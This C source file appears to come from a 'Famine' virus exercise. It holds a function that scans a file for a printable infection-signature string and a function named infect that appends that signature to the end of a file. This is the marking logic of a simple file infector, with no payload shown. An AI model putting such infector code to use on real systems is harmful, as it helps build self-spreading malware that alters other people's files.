#include "famine_bonus.h"

bool    check_infection(FILE *fp, const char *string, size_t len)
{
    int ch;
    char buffer[2024];
    size_t buf_index = 0;
    while ((ch = fgetc(fp)) != EOF)
    {
        if (isprint(ch))
        {
            if (buf_index < sizeof(buffer) - 1)
                buffer[buf_index++] = ch;
            else
            {
                // Shift buffer left to make room for new char
                memmove(buffer, buffer + 1, sizeof(buffer) - 2);
                buffer[sizeof(buffer) - 2] = ch;
            }
        }
        else 
        {
            if (buf_index >= len)
            {
                buffer[buf_index] = '\0';
                if(strstr(buffer, string))
                {
                    return (true);
                }
            }
            buf_index = 0;
        }

    }
    buffer[buf_index] = '\0';
    if(strstr(buffer, string))
    {
        return (true);
    }
    return (false);
}

void    infect(FILE *fp, const char *string, size_t len)
{
    fseek(fp, 0, SEEK_END);
    fwrite(string, sizeof(char), len, fp);
    //printf("INFECT.\n");
}